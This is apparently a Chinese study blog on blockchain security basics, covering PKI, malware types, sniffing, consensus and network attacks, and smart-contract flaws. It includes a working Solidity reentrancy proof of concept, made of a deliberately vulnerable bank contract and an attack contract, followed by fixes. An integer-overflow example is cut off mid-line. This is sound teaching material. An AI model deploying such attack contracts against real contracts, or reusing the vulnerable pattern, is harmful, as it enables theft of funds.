<h1 id="PKI技术"><a href="#PKI技术" class="headerlink" title="PKI技术"></a>PKI技术</h1><p>PKI(Pubic Key Infrastructure)即公钥基础设施，PKI是用公钥技术实施的，支持公钥的管理，并提供保密性、完整性、真实性以及可追究性安全服务的具有普适性的安全基础设施。</p>
<p>PKI在公钥密码基础上，<strong>主要解决密钥属于谁</strong>，即密钥认证的问题。</p>
<h2 id="PKI系统"><a href="#PKI系统" class="headerlink" title="PKI系统"></a>PKI系统</h2><p>一个典型的PKI系统包括<strong>PKI策略、软硬件系统、证书机构CA、注册机构RA、证书发布系统和PKI应用</strong>等。 </p>
<p><img src="/./img/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/PKI%E7%BB%84%E6%88%90.png"><br>PKI提供了以下几种主要安全服务：<br>1.认证-&gt;数字签名<br>2.完整性-&gt;数字签名&#x2F;消息认证码<br>3.机密性-&gt;密钥协商&#x2F;分配<br>4.不可否认性-&gt;数字签名</p>
<p>数字证书是PKI最基本的元素，也是承载PKI安全服务的最重要的载体。</p>
<h2 id="数字证书的认证过程"><a href="#数字证书的认证过程" class="headerlink" title="数字证书的认证过程"></a>数字证书的认证过程</h2><ol>
<li><strong>证书拆封</strong>：<strong>验证发行者CA的公钥能否正确解开客户实体</strong>——证书中的“发行者的数字签名”，即证明该证书是否为可信任的第三方CA机构所签发。如果能正确解开，输出结果即为用户的公钥，那么，这个签名被验证是正确的。因为它证明了这个证书是由权威的、可信任的认证机构所签发。</li>
<li><strong>序列号验证</strong>：检查实体证书中的签名实体序列号是否与签发者证书的序列号相一致，从而验证证书的真伪。</li>
<li><strong>有效期验证</strong>：<strong>检查用户证书使用的日期是否合法，有无过期</strong>。若超过CA证书有效期，交易是不安全的，实体证书应作废。</li>
<li><strong>撤销列表查询：检查用户的证书是否已经作废，并发布在证书撤销列表中。一般称CRL查询，俗称“黑名单查询”。</strong></li>
</ol>
<h2 id="交叉认证"><a href="#交叉认证" class="headerlink" title="交叉认证"></a>交叉认证</h2><p>PKI在全球互通可以有两种实现途径：<br>1.PKI体系的根CA交叉认证。<br>2.建立一个全球性的统一根CA，为各PKI体系的根证书颁发证书。这种方式是将不同的PKI体系组织在同一个全球根CA之下，这个全球CA可由一个国际组织，如联合国等来建设。考虑到各个PKI体系管理者一般都希望能保持本体系的独立自治性，全球统一根CA实现起来有一些具体的困难，所以，PKI体系之间的互通性一般用<strong>交叉认证</strong>来实现。</p>
<p>交叉认证是PKI中信任模型的概念。它是一种<strong>把以前无关的CA连接在一起的有用机制</strong>，从而使得它们在各自主体群之间实现安全通信。交叉认证的实际构成方法就是具体的交换协议报文。</p>
<h2 id="PKI应用"><a href="#PKI应用" class="headerlink" title="PKI应用"></a>PKI应用</h2><p>1.<strong>虚拟专用网络（VPN）</strong><br>它是一种架构在公用通信基础设施上的<strong>专用数据通信网络</strong>，利用网络层安全协议（尤其是IPSec）和<strong>建立在PKI上的</strong>加密与签名技术来获得私有性。<br>2.<strong>安全电子邮件</strong><br>安全电子邮件的目标是解决“内容可被偷看、内容可被篡改、发件人可被冒充”三大难题。<strong>安全电子邮件的典型协议（比如 S&#x2F;MIME），本质都是基于 PKI 体系设计的。</strong><br>3.Web安全——PKI 与 SSL<br>SSL核心作用是在客户端（浏览器）和服务器之间建立一条加密的安全通道，防止 Web 通信中的数据被窃听、篡改、冒充 —— 这也是 HTTPS 比 HTTP 安全的根本原因（HTTPS &#x3D; HTTP + SSL）。<br>利用PKI技术，服务器和客户端都对对方的证书进行验证，同时客户端生成会话密钥和选择消息摘要算法，利用服务器端的公钥加密会话密钥，传送给服务器，这样SSL协议就允许在浏览器和服务器之间进行加密通信。</p>
<h1 id="网络攻击与防御技术"><a href="#网络攻击与防御技术" class="headerlink" title="网络攻击与防御技术"></a>网络攻击与防御技术</h1><h2 id="计算机病毒"><a href="#计算机病毒" class="headerlink" title="计算机病毒"></a>计算机病毒</h2><p><strong>计算机病毒</strong>是一种恶意软件，可以通过感染计算机系统并在其中<strong>复制自身</strong>来破坏计算机系统、窃取信息或进行其他恶意活动。<br>◆文件感染型病毒(感染可执行文件)<br>◆引导型病毒（感染引导扇区）<br>◆宏病毒（感染应用程序的宏功能）<br>◆逻辑炸弹（一种预设条件触发的恶意代码）<br>◆蠕虫（一种自我复制并通过网络传播的病毒）<br>◆特洛伊木马（一种伪装成正常或有用程序）<br>◆Rootkit（植入系统内核或应用程序中的一种恶意软件，目的是隐藏自身活动，绕过系统安全控制）<br>◆勒索软件（一种加密文件然后勒索用户赎金的恶意软件）<br>◆下载器病毒（感染电子邮件附件、恶意链接、在线广告或软件下载等，其主要功能是下载并安装其他恶意软件、病毒或间谍软件到受感染的计算机系统中。）<br>◆漏洞利用<br><img src="/./img/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E7%B1%BB%E5%9E%8B%E4%B8%80%E8%A7%88.png"></p>
<p>目前计算机病毒发展趋势：<br>1.AI和机器学习<br>2.指向性攻击（攻击可能会采用APT攻击）<br>3.IoT和移动设备攻击<br>4.加密货币挖矿病毒（这种病毒会利用感染的计算机资源来挖掘加密货币，占用系统性能和资源。）<br>5.社交工程和钓鱼攻击（伪装诱导用户点击和下载）<br>6.漏洞</p>
<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p>漏洞根据其来源或性质进行分类：系统漏洞、网络漏洞、应用漏洞、物理漏洞、人为漏洞。</p>
<p>系统漏洞——Web漏洞：XSS跨站脚本、SQL注入、CSRF跨站请求伪造、SSRF、文件上传漏洞（非法用户可以利用上传的恶意脚本文件控制整个网站）、命令执行、逻辑漏洞。</p>
<h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h2><p>扫描：IP扫描（Ping扫描）、端口扫描、漏洞扫描。<br>端口扫描可以分为TCP扫描和UDP扫描，TCP端口扫描即三次握手。</p>
<h2 id="嗅探方法"><a href="#嗅探方法" class="headerlink" title="嗅探方法"></a>嗅探方法</h2><p>几种在交换网络中实现的嗅探方法：<br>1.MAC洪泛<br>向交换机发送大量含有虚构的MAC地址和IP地址的包，使交换机无法处理如此多的信息，致使交换机进入了所谓的“打开失效”模式，也就是开始了类似于集线器的工作方式，向网络上所有机器<strong>广播</strong>数据包。<br>2.MAC欺骗<br>攻击者通过将源MAC地址伪造为目标主机的源MAC地址，并将这样的数据包通过交换机发送出去，使得交换机不断的更新MAC—端口映射表，从而让交换机相信攻击者主机的MAC就是目标主机的MAC，交换机就会把本应发送给目标主机的数据包发送给攻击者。<br>3.ARP欺骗<br>攻击者通过对网关和目标主机进行ARP欺骗，就可以截获两者之间的通信数据，实现嗅探的目的。</p>
<h1 id="恶意代码及防范技术与漏洞挖掘技术"><a href="#恶意代码及防范技术与漏洞挖掘技术" class="headerlink" title="恶意代码及防范技术与漏洞挖掘技术"></a>恶意代码及防范技术与漏洞挖掘技术</h1><h2 id="恶意代码"><a href="#恶意代码" class="headerlink" title="恶意代码"></a>恶意代码</h2><p><strong>恶意代码</strong>是指能够引起计算机故障，破坏计算机数据，影响计算机系统的正常使用的程序、代码或一组指令。</p>
<p>基本特征：<br>1.恶意性：以破坏、窃取、控制为目的<br>2.可执行性：是一段可以执行的程序<br>3.隐蔽性：通常隐藏自身，不易被发现<br>4.潜伏性：可能在系统中潜伏一段时间后才发作<br>5.自我复制性：能够自我复制（病毒、蠕虫等）</p>
<p>恶意代码的命名规则：&lt;病毒前缀&gt;.&lt;病毒名&gt;.&lt;病毒后缀&gt;<br>1.病毒前缀是指一个病毒的<strong>种类</strong>。<br>2.病毒名是指一个病毒的<strong>家族特征</strong>，是用来区别和标识病毒家族的。<br>3.病毒后缀是指一个病毒的<strong>变种特征</strong>，是用来区别具体某个家族病毒的某个变种的。</p>
<p><strong>恶意代码的生命周期</strong><br>1.设计期：用编程语言制造一个恶意代码<br>2.传播期：通过不同的途径散布和侵入受害系统中<br>3.感染期：找到自己依附或隐藏的宿主，并实施依附或隐藏<br>4.触发期：满足触发条件时，恶意代码进入运行期<br>5.运行期：恶意代码的恶意目的得以展现<br>6.消亡期：恶意代码被检测出来，并应用相应的手段进行处理。</p>
<p>恶意代码传播主要是通过<strong>复制文件、传送文件、运行程序</strong>等方式进行。</p>
<p>◆分析方法<br>1.静态分析法（不执行恶意代码的情况下分析）<br>2.动态分析法（通过检测恶意代码执行的过程来分析）</p>
<p>在实际应用中，一般将恶意代码分析方法分成三类：基于<strong>代码特征</strong>的分析方法、基于<strong>代码语义</strong>的分析方法、基于<strong>代码行为</strong>的分析方法。</p>
<p>◆检测方法<br>1.基于特征码的检测法<br>2.基于行为的检测法<br>…</p>
<h2 id="漏洞-1"><a href="#漏洞-1" class="headerlink" title="漏洞"></a>漏洞</h2><p>许多安全漏洞是<strong>程序错误导致</strong>的，此时可叫做<strong>安全缺陷</strong>，但并不是所有的安全隐患都是程序安全缺陷导致的。</p>
<p>POC （Proof of concept）是对某些想法的一个较短而不完整的实现，以<strong>证明其可行性，示范其原理，其目的是为了验证一些概念或理论</strong>。概念验证通常被认为是一个有里程碑意义的实现的原型 。</p>
<p>零日漏洞 （zero-day vulnerability、0-day vulnerability）通常是指还没有补丁的安全漏洞，而零日攻击（zero-day exploit、zero-day attack）则是指利用这种漏洞进行的攻击。</p>
<blockquote>
<p>一句话：一个软件 &#x2F; 系统的 “致命缺陷”，开发者还没发现、没修复，黑客却已经知道并开始利用了。</p>
</blockquote>
<ul>
<li><strong>源代码</strong>：程序员写的人类能看懂的代码（比如 Rust 的 <code>.rs</code> 文件、C 的 <code>.c</code> 文件）；</li>
<li><strong>目标代码</strong>：源代码编译后生成的机器能看懂的二进制文件（比如 Windows 的 <code>.exe</code>、Linux 的 <code>.bin</code>、手机的 <code>.apk</code> 里的执行文件）。</li>
</ul>
<p>◆大多数商业软件的源代码很难获得，一般只有一些开源系统能为挖掘者提供源码，如LINUX系统，所以<strong>目前基于源代码的挖掘一般都是LINUX系统及其开源软件</strong>。<br>◆对于不能提供源码的系统或软件而言，只能采用基于目标代码的漏洞挖掘方法（也叫二进制漏洞挖掘），该方法一般涉及程序编译器、计算机硬件指令系统、可执行文件格式等方面的分析技术，实现难度较大。</p>
<p>WEB漏洞 ：通常是指网站程序上的漏洞，可能是由于代码编写者在编写代码时考虑不周全等原因而造成的漏洞，常见的WEB漏洞有Sql注入、Xss漏洞、文件上传漏洞等。</p>
<p>漏洞挖掘的一般流程：<br>1.信息收集：子域名枚举、C段扫描、移动设备资产、HTTPS证书、备案号<br>2.端口扫描：使用nmap等工具扫描开放端口<br>3.目录爆破：使用DirBuster、御剑等工具扫描Web目录<br>4.漏洞探测：使用AWVS、xray等工具自动化扫描<br>5.漏洞验证：手动验证漏洞是否存在<br>6.漏洞利用：构造POC（Proof of Concept）验证漏洞</p>
<p><strong>黑盒测试</strong>指把被测试目标看做一个黑盒子，<strong>对于内部结构、运作情况是不可见的</strong>。<strong>模拟黑客的攻击行为，找出目标点存在的漏洞</strong>。</p>
<table>
<thead>
<tr>
<th>对比维度</th>
<th>黑盒测试</th>
<th>白盒审计</th>
</tr>
</thead>
<tbody><tr>
<td>核心视角</td>
<td>外部视角（像黑客一样，看不到源码）</td>
<td>内部视角（像开发者一样，能看源码）</td>
</tr>
<tr>
<td>测试方式</td>
<td>输入异常数据，看输出结果找漏洞</td>
<td>通读代码逻辑，直接找设计缺陷</td>
</tr>
</tbody></table>
<h1 id="区块链攻击与防御"><a href="#区块链攻击与防御" class="headerlink" title="区块链攻击与防御"></a>区块链攻击与防御</h1><p><img src="/./img/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/%E5%8C%BA%E5%9D%97%E9%93%BE%E7%BB%93%E6%9E%84.png"><br>6.应用层 -&gt; 用户交互<br>5.合约层 -&gt; 程序自动化 -&gt; 合约漏洞、合约虚拟机漏洞<br>4.激励层 -&gt; 系统维护激励<br>3.共识层 -&gt; 数据一致性，授权&#x2F;非授权 -&gt;女巫攻击、51%攻击<br>2.网络层 -&gt; 节点通信与数据传输 -&gt; 主要是针对 P2P 网络的恶意攻击<br>1.数据层 -&gt; 区块链数据存储 -&gt; 数据隐私窃取和恶意数据攻击</p>
<p>在实际的区块链攻击场景中，攻击者发起攻击旨在非法获取最大化的利益，但并不是所有的区块链攻击方式都可以使攻击者直接获利。此外，部分区块链攻击对实施场景和条件要求过高，使得其可行性受到了严重的制约。因此，<strong>攻击者通常采用一系列跨层级的区块链攻击方式来实现最大化的获利目的，这种攻击序列为攻击簇</strong>。</p>
<h2 id="共识层攻击"><a href="#共识层攻击" class="headerlink" title="共识层攻击"></a>共识层攻击</h2><p>◆<strong>共识层</strong>是区块链技术体系的核心架构，其中的<strong>共识算法可以保证全网节点在去信任化的场景中对分布式账本数据达成共识，为区块链的去中心化、信任化提供了保障</strong>。<br>共识层面临的安全威胁主要是，攻击者可以通过各种手段<strong>阻止全网节点达成正确的共识</strong>。在授权共识机制中，各节点对共识过程的影响相同，所以易遭受<strong>女巫攻击</strong>；而在非授权共识机制中，各对等节点利用自身所持资源（如算力、权益）竞争记账权，进而达成共识。投入的资源越多，则成功率越高，因此易遭受<strong>51%攻击</strong>。攻击者可能出于利益目的，通过贿赂攻击、币龄累计攻击等方式非法获取大量资源，从而发起51%攻击，以实现代币双花、历史修复、期货卖空、自私挖矿等目的。此外，攻击者还可以通过无利害关系攻击、预计算攻击等方式影响全网共识进程，进而获利。</p>
<table>
<thead>
<tr>
<th>共识机制</th>
<th>核心特点</th>
<th>最怕的攻击</th>
<th>攻击后果</th>
</tr>
</thead>
<tbody><tr>
<td>授权共识</td>
<td>节点平等，一人一票</td>
<td>女巫攻击（假节点充数）</td>
<td>少数人操控投票结果</td>
</tr>
<tr>
<td>非授权共识</td>
<td>资源越多，话语权越大</td>
<td>51% 攻击（垄断资源）</td>
<td>篡改交易、双花代币牟利</td>
</tr>
</tbody></table>
<p>Sybil Attack（女巫攻击）对区块链网络的攻击方式：<br>1.虚假节点接入<br>2.误导区块链节点的路由选择<br>3.虚假资源发布</p>
<table>
<thead>
<tr>
<th align="left">对比维度</th>
<th align="left">短程 51% 攻击</th>
<th align="left">长程 51% 攻击</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>攻击范围</strong></td>
<td align="left">只针对<strong>本轮记账权</strong></td>
<td align="left">针对<strong>整条区块链的历史和未来</strong></td>
</tr>
<tr>
<td align="left"><strong>核心操作</strong></td>
<td align="left">垄断单次记账，乱记账 &#x2F; 卡交易</td>
<td align="left">私下造更长的假链，替换主链</td>
</tr>
<tr>
<td align="left"><strong>典型危害</strong></td>
<td align="left">临时交易阻塞、垄断单次奖励</td>
<td align="left">双花攻击、篡改历史记录</td>
</tr>
<tr>
<td align="left"><strong>攻击成本</strong></td>
<td align="left">较低（只需本轮超过 50% 资源）</td>
<td align="left">极高（要持续算更长的链，耗资源）</td>
</tr>
</tbody></table>
<p><strong>在实际的区块链网络中，攻击者可能将51%攻击作为一种子攻击，进而实现其他攻击</strong>。<br>比如双花攻击、历史修复攻击、卖空攻击、自私挖矿攻击。</p>
<p>双花攻击可以用短程51%攻击实现吗？<br>不可以。双花攻击的核心需求是必须<strong>删除已经上链的交易记录</strong>，还要让全网承认 “这笔交易没发生过”—— 这需要<strong>篡改历史账本</strong>，不是 “临时垄断一次记账权” 就能搞定的。</p>
<h2 id="网络层攻击"><a href="#网络层攻击" class="headerlink" title="网络层攻击"></a>网络层攻击</h2><p> 区块链网络是由P2P网络构建，P2P网络主要涉及用户客户端和对等网络结构，P2P网络的攻击可能针对这几个方面展开如下攻击：<br>（1）客户端漏洞<br>（2）窃听攻击<br>（3）<strong>日蚀攻击</strong>（eclipse attack）：攻击者通过特定手段使得目标节点只能获得被操纵的、伪造的网络视图，将其从实际的网络视图中隔离出来，从而妨碍目标节点正常运转，以达成特定的攻击目的。攻击者操纵多个对等节点<strong>与目标节点保持长时间的传输连接，使其在线链接数达到目标节点的入站连接上限，从而阻止其他合法节点的连接请求</strong>。此时，目标节点被攻击者从P2P网络中“隔离”出来，导致目标节点无法正常维护区块链账本。</p>
<blockquote>
<p>一句话：把目标节点关进小黑屋，只给它看假数据。</p>
</blockquote>
<p>（4） <strong>Eclipse攻击</strong>是指攻击者通过侵占节点的路由表，将足够多的虚假节点（sybil 节点）添加到某些节点的邻居节点集合中，从而将这些节点“隔离”于正常区块链网络之外。</p>
<p>（5）<strong>拒绝服务攻击</strong>（Dos攻击），攻击者利用大量网络资源攻击计算机系统或网络，使其停止响应甚至崩溃，从而拒绝服务。<strong>实际中，用户节点资源通常受限，攻击者只能通过分布式DoS攻击（简称DDoS）整合零散网络带宽</strong>来实施DoS攻击。</p>
<h2 id="合约层攻击"><a href="#合约层攻击" class="headerlink" title="合约层攻击"></a>合约层攻击</h2><p>（1）整数溢出漏洞：智能合约代码中，整数型变量都存在上限或下限，当变量存储的数值超过上限则称为整数上溢，超过下限则称为整数下溢。<strong>当一个整数变量发生溢出时，可能会从一个很大的数变成很小的数或者从一个很小的数变成很大的数。利用这个漏洞，攻击者通常通过输入异常参数致使整数溢出，从而达到修改地址指针，实现代码异常调用的目的。</strong><br>（2）重入攻击：攻击者针对智能合约代码的重入漏洞发起的攻击，<strong>可导致两个智能合约发生循环调用</strong>。</p>
<h1 id="隐私威胁保护"><a href="#隐私威胁保护" class="headerlink" title="隐私威胁保护"></a>隐私威胁保护</h1><h2 id="同态加密"><a href="#同态加密" class="headerlink" title="同态加密"></a>同态加密</h2><p>（1）同态加密是一种公钥加密算法，加密使用公钥pk，解密使用私钥sk。<br>（2）密文具有计算功能，无需解密就能对加密数据进行处理，处理过程不会泄露任何原始内容，拥有密钥的用户解密后可以得到处理后的结果。<br>（3）使用同态加密技术，运行在区块链上的智能合约可以处理密文，而无法获知真实数据，极大地提高了隐私安全性。<br>挑战：性能开销、密文长度扩张、 可扩展性、密钥管理。</p>
<h2 id="零知识证明"><a href="#零知识证明" class="headerlink" title="零知识证明"></a>零知识证明</h2><p>指的是证明者能够在不向验证者提供任何有用的信息的情况下，使验证者相信某个论断是正确的。<br>零知识，即在证明的过程中不透露任何内情。通俗的来讲，就是既证明了自己想证明的事情，同时透露给验证者的信息为“零”。</p>
<p>特点：<br>（1）隐私保护：零知识证明允许在不泄露敏感信息的前提下向他人证明某个主张的真实性，从而保护了个人的隐私和数据安全。<br>（2）不可伪造性：零知识证明要求证明者以一种无法被伪造的方式向验证者证明某个主张的真实性，确保了证明的可靠性和完整性。<br>（3）交互式验证：零知识证明通常需要证明者和验证者之间进行多轮的交互式通讯和计算，以确认证明的有效性。</p>
<h2 id="环签名技术"><a href="#环签名技术" class="headerlink" title="环签名技术"></a>环签名技术</h2><p>环签名通过将实际签名者的公钥藏进一个公钥集合，来达到保护签名者身份的目的。</p>
<ol>
<li>匿名性保护。环签名可以防止交易链上的身份追踪。</li>
<li>数据隐私保护。环签名可以保护交易内容的机密性。</li>
<li>抗审查性保护。环签名可以防止审核和审查。</li>
<li>信任建立。环签名可以建立信任。</li>
</ol>
<h2 id="隐私威胁"><a href="#隐私威胁" class="headerlink" title="隐私威胁"></a>隐私威胁</h2><p>区块链作为一种分布式账本技术，其核心特性之一是数据的安全性和透明性。然而，它仍然面临着一些隐私威胁。</p>
<ol>
<li>交易信息隐私泄露。区块链上的交易信息，如发送者、接收者和交易金额，可能会被泄露。为了保护这些信息，可以采用混币、环签名和机密交易等技术。</li>
<li>智能合约隐私漏洞。智能合约可能存在漏洞，如果被黑客利用，可能会导致系统崩溃或交易数据泄露。为了防范这一风险，可以采用零知识证明、多方安全计算、同态加密等技术来保护合约数据。</li>
<li>链上数据隐私泄露。区块链上的交易数据虽然与用户身份信息分离，但仍有可能通过分析交易模式来追踪用户的身份。为了进一步保护隐私，可以采用账本隔离、私有数据和数据加密授权访问等解决方案。</li>
</ol>
<p>用户身份隐私主要是指交易双方的地址信息，其本质是双方公钥的哈希值。最常用的解决方案主要是<strong>混币机制</strong>，也就是将多笔交易混合在一起，切断加密货币中交易方与接收方的联系，提高加密货币的隐私性和匿名性。</p>
<h1 id="大一链安漏洞了解"><a href="#大一链安漏洞了解" class="headerlink" title="大一链安漏洞了解"></a>大一链安漏洞了解</h1><h2 id="1-重入攻击（Reentrancy）"><a href="#1-重入攻击（Reentrancy）" class="headerlink" title="1.重入攻击（Reentrancy）"></a>1.重入攻击（Reentrancy）</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>重入攻击多发生在涉及 “转账 + 余额记录” 的合约中，它利用合约调用外部合约时，外部合约可能会再次调用目标合约的函数，从而导致合约状态被反复修改。<br>核心原因是合约在转账后才更新用户余额，导致攻击者可在余额更新前多次触发提款逻辑，直到合约余额被耗尽。</p>
<h3 id="典型案例"><a href="#典型案例" class="headerlink" title="典型案例"></a>典型案例</h3><p>The DAO 攻击事件：这是区块链史上最著名的重入攻击。一个名为 “The DAO” 的去中心化自治组织（类似去中心化基金）被黑客利用重入漏洞，盗走了约 5000 万美元的 ETH。最终以太坊通过 “硬分叉” 回滚交易才解决，也因此分裂出以太坊（ETH）和以太坊经典（ETC）。</p>
<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract VulnerableBank&#123;</span><br><span class="line">    mapping (address=&gt;uint256)public balances;</span><br><span class="line"></span><br><span class="line">    //存钱</span><br><span class="line">    function deposit()public payable&#123;</span><br><span class="line">        balances[msg.sender]+=msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    //取款</span><br><span class="line">    function withdraw() public&#123;</span><br><span class="line">        uint256 amount=balances[msg.sender];</span><br><span class="line">        require(amount&gt;0,&quot;Insufficient balance&quot;);</span><br><span class="line">        (bool sucess, )=msg.sender.call&#123;value:amount&#125;(&quot;&quot;);</span><br><span class="line">        require(sucess,&quot;Transfer failed&quot;);</span><br><span class="line">        balances[msg.sender]=0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">contract AttackContract&#123;</span><br><span class="line">    VulnerableBank public bank;</span><br><span class="line">  </span><br><span class="line">    constructor(address _bank)&#123;</span><br><span class="line">        bank=VulnerableBank(_bank);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    receive()external payable&#123;</span><br><span class="line">        if(address(bank).balance&gt;=1 ether)&#123;</span><br><span class="line">            bank.withdraw();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    function attack()public payable&#123;</span><br><span class="line">        bank.deposit&#123;value:1 ether&#125;();//假装存1ETH</span><br><span class="line">        bank.withdraw();//假装取走自己的1ETH：自动触发攻击合约里的fallback函数：再次调用withdraw函数...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getbalance() public view returns(uint256)&#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>测试流程：第一步，先部署<code>VulnerableBank</code>合约，模拟一个普通用户存入2ether；第二步，部署<code>AttackContract</code>合约（传入<code>VulnerableBank</code>合约地址）；第三步，攻击者携带1ether调用<code>AttackContract</code>合约里的<code>attack()</code>函数。</p>
<h3 id="如何预防重入攻击？"><a href="#如何预防重入攻击？" class="headerlink" title="如何预防重入攻击？"></a>如何预防重入攻击？</h3><ol>
<li>遵循 Checks-Effects-Interactions 模式</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function withdraw()public&#123;</span><br><span class="line">      uint256 amount=balances[msg.sender];</span><br><span class="line">      require(amount&gt;0,&quot;Insufficient balance&quot;);</span><br><span class="line">      balances[msg.sender]=0;//先更新余额</span><br><span class="line">      (bool sucess, )=msg.sender.call&#123;value:amount&#125;(&quot;&quot;);</span><br><span class="line">      require(sucess,&quot;Transfer failed&quot;);//再转账</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这样一来，攻击者第一次取钱后，余额已经是 0，就算<code>fallback()</code>再调用<code>withdraw()</code>，银行会检查到 “余额为 0”，拒绝转账。</p>
<ol start="2">
<li>加重入锁（Reentrancy）</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> // 引入库</span><br><span class="line">import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class="line"></span><br><span class="line">// 继承重入锁合约</span><br><span class="line">contract SafeBank is ReentrancyGuard &#123;</span><br><span class="line">    mapping (address=&gt;uint256)public balances;</span><br><span class="line">    function deposit()public payable&#123;</span><br><span class="line">        balances[msg.sender]+=msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    // 加锁：withdraw执行时，其他调用会被拒绝</span><br><span class="line">    function withdraw() public nonReentrant &#123;</span><br><span class="line">        uint256 amount=balances[msg.sender];</span><br><span class="line">        require(amount&gt;0,&quot;Insufficient balance&quot;);</span><br><span class="line">        balances[msg.sender]=0;</span><br><span class="line">        (bool sucess, )=msg.sender.call&#123;value:amount&#125;(&quot;&quot;);</span><br><span class="line">        require(sucess,&quot;Transfer failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>nonReentrant</code>修饰符会在函数开始时 “上锁”，结束后 “解锁”，中间如果有重复调用（比如攻击者的<code>fallback()</code>），会直接失败。</p>
<h2 id="2-整数溢出攻击"><a href="#2-整数溢出攻击" class="headerlink" title="2.整数溢出攻击"></a>2.整数溢出攻击</h2><h3 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h3><p><strong>溢出（Overflow）</strong>：当一个整数达到其最大值后，再试图加 1，会变成最小值（类似时钟 “绕一圈”）。<br><strong>下溢（Underflow）</strong>：当一个整数达到其最小值后，再试图减 1，会变成最大值。<br>在智能合约中，如果没有注意这点，会被攻击者利用来篡改数据（如余额、代币数量等）。</p>
<h3 id="典型案例-1"><a href="#典型案例-1" class="headerlink" title="典型案例"></a>典型案例</h3><p>2018年4月23日，BEC 代币合约用了旧版本 Solidity，<code>transfer</code> 函数没防御溢出，攻击者利用漏洞，通过一次转账让自己的余额下溢成极大值（约 2^255 个代币），随后在交易所抛售，导致 BEC 币价瞬间归零，项目直接崩盘。</p>
<h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.7.0;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">contract VulnerableToken &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"> function setMaxSupply() public &#123;</span><br><span class="line">     // uint256最大值是2^256 - 1，减1就是2^256 - 2</span><br><span class="line">     totalSupply = type(uint256).max - 